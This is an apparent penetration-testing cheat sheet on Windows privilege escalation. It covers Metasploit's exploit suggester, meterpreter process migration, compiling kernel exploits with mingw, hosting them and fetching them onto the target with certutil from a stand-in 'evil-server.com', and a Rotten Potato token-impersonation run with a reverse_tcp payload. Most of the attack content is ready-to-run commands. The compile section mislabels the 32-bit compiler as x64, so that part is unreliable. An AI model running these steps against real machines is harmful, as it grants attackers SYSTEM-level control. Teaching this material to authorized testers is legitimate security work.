# Privilege escalation techniques

## Kernel exploitation

### Metasploit

```bash
msf6> use post/multi/recon/local_exploit_suggester
# meterpreter session id
msf6> set SESSION
msf6> run
```

Once an exploit has completed successfully and you have a meterpreter session open, try to find a process with NT AUTHORITY as the process owner to escalate privileges.
```bash
meterpreter> getuid
meterpreter> getprivs
meterpreter> ps
meterpreter> migrate <PID>
```

### Compile Windows exploits

Enumerate kernel exploits with winPEAS or some other tool and search the internet for the found exploits. The first suggested exploit is probably the best choice.

```bash
# install the requirements
$ sudo apt install mingw-w64
$ wget http://github.com/some-suggested-exploit/exploit.c

# compile for x64
$ i686-w64-mingw32-gcc exploit.c -o exploit.exe

# compile for x86
$ i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws_32
```

Host the exploit on an existing server or use the python module
```bash
# host the contents of the current directory
python -m SimpleHTTPServer 8080
```

```bash
# download the file on Windows
> certutil -urlcache -f http://evil-server.com/exploit.exe exploit.exe
> .\exploit.exe
```

---

## Token impersonation

Token impersonation attacks leverage specific Windows privileges to obtain an access token with administrative privileges to escalate privileges from the account with lowest privileges to highest privileges available (NT AUTHORITY\SYSTEM).

Interesting privileges:

- *SeAssignPrimaryToken*: allows a user to impersonate tokens with tools

- *SeCreateToken*: allows a user to create an arbitrary token with administrative privileges

- *SeImpersonatePrivilege*: allows a user to create a process under the security contex of another user (with administrative privileges)

### Rotten potato attack

```bash
# list current user's privileges
meterpreter> getprivs
> whoami /priv

# example exploit suggested by windows-exploit-suggester
msf6> use exploit/windows/local/ms16_075_reflection
msf6> set payload windows/x64/meterpreter/reverse_tcp
msf6> run

# load a module to automate the impersonation process
meterpreter> load incognito
meterpreter> list_tokens -u
meterpreter> impersonate_token "NT AUTHORITY\SYSTEM"
# verify privilege escalation
meterpreter> getuid
```

---